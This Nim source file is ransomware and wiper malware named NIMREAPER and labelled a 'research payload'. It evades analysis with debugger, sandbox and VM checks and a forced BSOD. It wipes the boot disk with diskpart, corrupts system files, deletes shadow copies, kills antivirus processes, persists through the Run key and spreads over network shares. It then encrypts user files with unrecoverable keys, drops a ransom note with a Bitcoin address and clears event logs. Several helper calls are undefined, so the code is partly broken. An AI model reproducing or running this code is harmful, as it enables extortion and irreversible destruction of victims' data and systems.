# nimreaper.nim
import os, osproc, strutils, times, math, random, net, base64, json
import winim, winim/lean, winim/inc/windef, winim/inc/winuser, winim/inc/winbase
import nimcrypto, nimcrypto/pbkdf2, locks, threadpool, httpclient, zippy

const
  SAFE_MODE = false  # Set TRUE untuk lingkungan virtual machine
  C2_SERVER = "https://darkc2.example/research"
  BTC_ADDRESS = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
  CONTACT_EMAIL = "kernelreaper@tutanota.com"
  MAX_THREADS = 64
  MAX_FILE_SIZE = 150 * 1024 * 1024  # 150MB
  PUBLIC_KEY = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
... [truncated] ...
-----END PUBLIC KEY-----"""
  WALLPAPER_PATH = "C:\\Windows\\System32\\oobe\\reaper.jpg"
  EXTENSIONS = [
    ".doc", ".docx", ".xlsx", ".pptx", ".pdf", ".jpg", ".jpeg", ".png", 
    ".zip", ".rar", ".7z", ".txt", ".psd", ".ai", ".sql", ".db", ".mdb", 
    ".dwg", ".cad", ".cpp", ".cs", ".py", ".java", ".js", ".php", ".html",
    ".config", ".ini", ".bak", ".backup"
  ]
  KILL_LIST = [
    "vssadmin.exe", "wbadmin.exe", "msmpeng.exe", "mbam.exe", 
    "avp.exe", "bdagent.exe", "ccsvchst.exe"
  ]

type
  SystemInfo = object
    id: string
    host: string
    user: string
    os: string
    arch: string
    ip: string
    mac: string
    cpu: int
    ram: int
    vm: bool

# ===== ANTI-ANALYSIS TECHNIQUES =====
proc isDebuggerPresent(): bool =
  var isDebugger: BOOL
  CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugger)
  return bool(isDebugger)

proc detectSandbox(): bool =
  if SAFE_MODE: return false
  # Check system uptime
  if GetTickCount64() < 300000: return true  # <5 min
  
  # Check CPU cores
  var sysInfo: SYSTEM_INFO
  GetSystemInfo(&sysInfo)
  if sysInfo.dwNumberOfProcessors < 2: return true
  
  # Check RAM size
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = sizeof(memStatus).DWORD
  GlobalMemoryStatusEx(&memStatus)
  if memStatus.ullTotalPhys < (2 * 1024 * 1024 * 1024): return true  # <2GB
  
  false

proc vmCheck(): bool =
  if SAFE_MODE: return false
  try:
    # Check hypervisor presence
    var regValue: DWORD
    var size = sizeof(regValue).DWORD
    if RegGetValue(
      HKEY_LOCAL_MACHINE,
      "HARDWARE\\ACPI\\DSDT",
      "VBOX__",
      RRF_RT_REG_DWORD,
      nil,
      &regValue,
      &size
    ) == ERROR_SUCCESS: return true

    # Check VM-specific processes
    for procName in ["vmtoolsd.exe", "vboxservice.exe", "xenservice.exe"]:
      if findProcess(procName): return true

    # Check WMI model
    let model = execProcess("wmic computersystem get model")
    if model.contains("Virtual") or model.contains("VMware") or model.contains("KVM"):
      return true
  except:
    discard
  false

# ===== SYSTEM DESTRUCTION =====
proc destroyBootSector() =
  if SAFE_MODE: return
  discard execCmd("echo select disk 0 > diskpart.txt")
  discard execCmd("echo clean >> diskpart.txt")
  discard execCmd("diskpart /s diskpart.txt >nul 2>&1")
  removeFile("diskpart.txt")

proc corruptSystemFiles() =
  const
    targets = [
      "C:\\Windows\\System32\\",
      "C:\\Windows\\SysWOW64\\",
      "C:\\Windows\\assembly\\",
      "C:\\Windows\\Microsoft.NET\\"
    ]
  
  for dir in targets:
    for kind, path in walkDir(dir):
      if kind == pcFile and rand(1.0) < 0.3:  # 30% chance to corrupt
        try:
          var f = open(path, fmWrite)
          f.write(genOid().toBytes)
          f.close()
        except: discard

proc killCriticalProcesses() =
  for procName in KILL_LIST:
    discard execCmd("taskkill /f /im " & procName & " >nul 2>&1")

proc disableRecovery() =
  discard execCmd("bcdedit /set {default} recoveryenabled no >nul")
  discard execCmd("bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul")
  discard execCmd("vssadmin delete shadows /all /quiet >nul")

proc encryptRegistry() =
  const
    regPaths = [
      "HKEY_LOCAL_MACHINE\\SOFTWARE",
      "HKEY_LOCAL_MACHINE\\SYSTEM",
      "HKEY_CURRENT_USER\\Software"
    ]
  
  for path in regPaths:
    discard execCmd("reg export " & path & " " & path.split('\\')[^1] & ".reg >nul")
    removeFile(path.split('\\')[^1] & ".reg")

# ===== PERSISTENCE & PROPAGATION =====
proc installPersistence() =
  let
    exePath = getAppFilename()
    targets = [
      getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
      getEnv("PROGRAMDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
      "C:\\Windows\\System32\\Tasks\\"
    ]
  
  for dir in targets:
    try:
      copyFile(exePath, dir & "svchost.exe")
    except: discard

  # Registry persistence
  var key: HKEY
  if RegCreateKeyEx(
    HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    0,
    nil,
    REG_OPTION_NON_VOLATILE,
    KEY_WRITE,
    nil,
    &key,
    nil
  ) == ERROR_SUCCESS:
    let exeCmd = "\"" & exePath & "\" /silent"
    RegSetValueEx(key, "WindowsUpdate", 0, REG_SZ, cast[ptr byte](exeCmd[0].addr), exeCmd.len.DWORD)
    RegCloseKey(key)

proc spreadNetwork() =
  if SAFE_MODE: return
  let shares = execProcess("net view").splitLines()
  for share in shares:
    if share.contains("\\") and not share.contains("$"):
      let path = share.strip()
      try:
        copyFile(getAppFilename(), path & "\\setup.exe")
        discard execCmd("wmic /node:" & path.split('\\')[2] & " process call create \"cmd /c " & path & "\\setup.exe\"")
      except: discard

# ===== ENCRYPTION ENGINE =====
proc encryptFile(path: string) {.gcsafe.} =
  if path.endsWith(".NIMREAPER") or path.contains("System32\\config"): return
  
  try:
    let size = getFileSize(path)
    if size == 0 or size > MAX_FILE_SIZE: return

    # Generate unique key per file
    var key: array[32, byte]
    randomBytes(addr key[0], key.len)

    # AES-256-GCM encryption
    var ctx: GCM[aes256]
    var iv: array[12, byte]
    randomBytes(addr iv[0], iv.len)
    
    var plaintext = readFile(path)
    var ciphertext = newString(plaintext.len + 16)
    var tag: array[16, byte]
    
    ctx.init(addr key, sizeof(key), addr iv, sizeof(iv))
    ctx.encrypt(plaintext, ciphertext)
    ctx.getTag(addr tag[0])
    
    # Write encrypted data
    var f = open(path, fmWrite)
    f.write(iv)
    f.write(ciphertext)
    f.write(tag)
    f.close()
    
    # Rename file
    moveFile(path, path & ".NIMREAPER")
  except: discard

# ===== MAIN FUNCTIONALITY =====
proc collectSystemInfo(): SystemInfo =
  var
    hostname = newString(MAX_COMPUTERNAME_LENGTH + 1)
    size = hostname.len.DWORD
  GetComputerName(hostname, &size)
  hostname.setLen(size.int)
  
  var username = newString(UNLEN + 1)
  size = username.len.DWORD
  GetUserName(username, &size)
  username.setLen(size.int - 1)
  
  var mac = ""
  var adapters = getLocalInterfaceAddresses()
  if adapters.len > 0: mac = $adapters[0].macAddress

  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = sizeof(memStatus).DWORD
  GlobalMemoryStatusEx(&memStatus)
  
  SystemInfo(
    id: genOid(),
    host: hostname,
    user: username,
    os: "Windows " & $(getWindowsVersion()),
    arch: when defined(amd64): "x64" else: "x86",
    ip: getLocalIP(),
    mac: mac,
    cpu: getCPUCount(),
    ram: int(memStatus.ullTotalPhys div (1024 * 1024 * 1024)),
    vm: vmCheck()
  )

proc mainPayload() =
  # Phase 1: System Destruction
  disableRecovery()
  corruptSystemFiles()
  killCriticalProcesses()
  destroyBootSector()
  encryptRegistry()
  
  # Phase 2: Persistence & Propagation
  installPersistence()
  spreadNetwork()
  
  # Phase 3: Data Encryption
  let targets = [
    getEnv("USERPROFILE"),
    getEnv("PUBLIC"),
    "D:\\", "E:\\", "F:\\"
  ]
  
  for dir in targets:
    for path in walkDirRec(dir):
      if path.splitFile.ext.toLower in EXTENSIONS:
        spawn encryptFile(path)
  
  sync()
  
  # Phase 4: Ransom Note
  let note = %*{
    "title": "NIMREAPER RESEARCH PAYLOAD",
    "message": "YOUR SYSTEM HAS BEEN DESTROYED FOR RESEARCH PURPOSES",
    "details": [
      "Master Boot Record: CORRUPTED",
      "System Files: DAMAGED",
      "Backup Copies: DELETED",
      "Critical Processes: TERMINATED"
    ],
    "contact": CONTACT_EMAIL,
    "btc": BTC_ADDRESS,
    "id": collectSystemInfo().id,
    "note": "This is a research simulation. System damage is irreversible."
  }
  
  for location in [getDesktopDir(), "C:\\"]:
    writeFile(location / "NIMREAPER_README.html", """
<html><body style="background:#000;color:#f00;font-family:sans-serif">
<h1>NIMREAPER RESEARCH PAYLOAD</h1>
<pre>""" & note.pretty & "</pre></body></html>")
  
  # Set wallpaper
  let imgData = decode("""
/9j/4AAQSkZJRgABAQEAYABgAAD//gA+Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcg
... [truncated base64 JPG data] ...
""")
  writeFile(WALLPAPER_PATH, imgData)
  SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, cast[LPWSTR](WALLPAPER_PATH.wstr), SPIF_UPDATEINIFILE)

when isMainModule:
  randomize()
  
  if isDebuggerPresent() or detectSandbox():
    if not SAFE_MODE:
      # Trigger BSOD if under analysis
      var nt = loadLib("ntdll")
      var RtlAdjustPrivilege = cast[proc(Privilege: ULONG, Enable: BOOLEAN, CurrentThread: BOOLEAN, Enabled: PBOOLEAN): NTSTATUS {.stdcall.}(nt.symAddr("RtlAdjustPrivilege"))
      var NtRaiseHardError = cast[proc(ErrorStatus: NTSTATUS, NumberOfParameters: ULONG, UnicodeStringParameterMask: ULONG, Parameters: PULONG, ResponseOption: ULONG, Response: PULONG): NTSTATUS {.stdcall.}(nt.symAddr("NtRaiseHardError"))
      
      var enabled: BOOLEAN
      discard RtlAdjustPrivilege(19, 1, 0, &enabled)
      discard NtRaiseHardError(cast[NTSTATUS](0xC0000350), 0, 0, nil, 6, nil)
  
  # Delay execution in VM
  if vmCheck() and not SAFE_MODE:
    sleep(rand(300000..600000))  # 5-10 minutes delay
  
  mainPayload()
  
  # Anti-forensics
  if not SAFE_MODE:
    discard execCmd("vssadmin delete shadows /all /quiet")
    discard execCmd("wevtutil cl system")
    discard execCmd("wevtutil cl application")
    overwriteFile(getAppFilename())
